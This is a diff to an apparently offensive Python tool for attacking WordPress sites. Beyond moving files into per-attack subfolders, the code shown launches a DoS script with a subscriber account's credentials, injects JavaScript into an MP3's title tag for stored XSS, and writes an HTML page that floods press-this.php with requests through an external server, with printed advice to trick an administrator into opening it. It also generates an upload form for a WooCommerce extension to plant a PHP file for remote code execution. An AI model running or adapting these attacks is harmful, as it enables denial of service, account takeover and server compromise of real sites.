@@ -100,7 +100,7 @@ while not(choice_num == 99):
 		print(" - In order to perform this exploit, you need at least a subscriber account.")
 		username = input(" - Insert username: ")
 		password = input(" - Insert password: ")
-		os.system("sh modules/dos.sh " + url + " " + username + " " + password)
+		os.system("sh modules/Dos/dos.sh " + url + " " + username + " " + password)
 		print(" - DOS attack performed succesfully on target " + url)
 		print("   ------------------------------------------------------------------")
 		print("\n")
@@ -115,8 +115,6 @@ while not(choice_num == 99):
 		print(" - This issue can be exploited by uploading a malicious MP3 file into a wordpress playlist within a file.")
 		print(" - The attacker can put any javascript code inside the meta information of an audio file.")
 		print(" - This exploit will automatically create the MP3 file for you.")
-		#js_code = input("Insert here the javascript code you want to inject: ")
-		#title = "Hacking in the deep                                                      </noscript>" + js_code
 		prefix_title = "Hacking in the deep                                                      </noscript>"
 		print("   ------------------------------------------------------------------")
 		print(" - Possible actions: ")
@@ -155,11 +153,11 @@ while not(choice_num == 99):
 			script =  Support.mail_xss(user_mail)
 
 		title = prefix_title + script
-		audio = EasyID3("modules/xss.mp3")
+		audio = EasyID3("modules/XSS/xss.mp3")
 		audio['title'] = title
 		audio.save()
 		print("   ------------------------------------------------------------------")
-		print(" - At this point, the MP3 file is created and stored in the modules folder.")
+		print(" - At this point, the MP3 file is created and stored in the modules/XSS folder.")
 		print(" - Create a post in the wordpress site, and create a playlist.")
 		print(" - Add the MP3 file in the playlist and the javascript code in injected.")
 		print("   ------------------------------------------------------------------")
@@ -174,17 +172,17 @@ while not(choice_num == 99):
 		print("   *                       XSS + DOS attack                         *")
 		print("   ******************************************************************") 
 		print(" - In order to perform this exploit, you need an external server.")
-		print(" - Move the foo.txt file that you find in the modules folder on your server.")
+		print(" - Move the foo.txt file that you find in the modules/XSS_DOS folder on your server.")
 		ipaddress = input(" - Put here the IP address of the external server: ")
 		wp_url = url + 'wp-admin/'
 		external_server = 'http://' + ipaddress + '/foo.txt'
 		external_parsed = urllib.parse.quote(external_server, safe='')
 		item = '<img src=\'' + url + '/wp-admin/press-this.php?u=' + external_parsed + '&url-scan-submit=Scan&a=b\'>'
-		external_file = open("modules/dos.html", "w")
+		external_file = open("modules/XSS_DOS/dos.html", "w")
 		for i in range(25):
 			external_file.write(item)
 
-		print(" - At this point a file dos.html is generated in the modules folder.") 
+		print(" - At this point a file dos.html is generated in the modules/XSS_DOS folder.") 
 		print(" - Move the html file on a reachable server. ")
 		print(" - Convince an administrator to visit that webpage. This would perform a DOS attack.")
 		print("   ------------------------------------------------------------------")
@@ -197,10 +195,10 @@ while not(choice_num == 99):
 		print("   ******************************************************************")
 		print(" - In order to perform this exploit, the target site requires Catalog Enquiry as an extension of WooCommerce plugin.") 
 
-		form_file = open("modules/form.html", "w")
+		form_file = open("modules/RCE/form.html", "w")
 		form_file.write("<html><body><form action=\"" + url + "/wp-admin/admin-ajax.php\" method=\"POST\" enctype=\"multipart/form-data\"><input type=\"hidden\" name=\"action\" value=\"send_enquiry_mail\" /><input type=\"file\" name=\"fileupload[0]\" /><input type=\"submit\" value=\"Submit\" /></form></body></html>")
 
-		print(" - A file form.htlm is generated in the modules folder, consisting of a simple form to update files.")
+		print(" - A file form.htlm is generated in the modules/RCE folder, consisting of a simple form to update files.")
 		print(" - You can upload whatever file you want, including files containing code instruction you want to execute on the server side.")
 		print(" - As a demonstration, upload the file rce.php that you find in the modules folder.")
 		print(" - Visit the " +url+"/wp-content/uploads/catalog_enquiry/[name of your file] folder to access the content of your uploaded file")
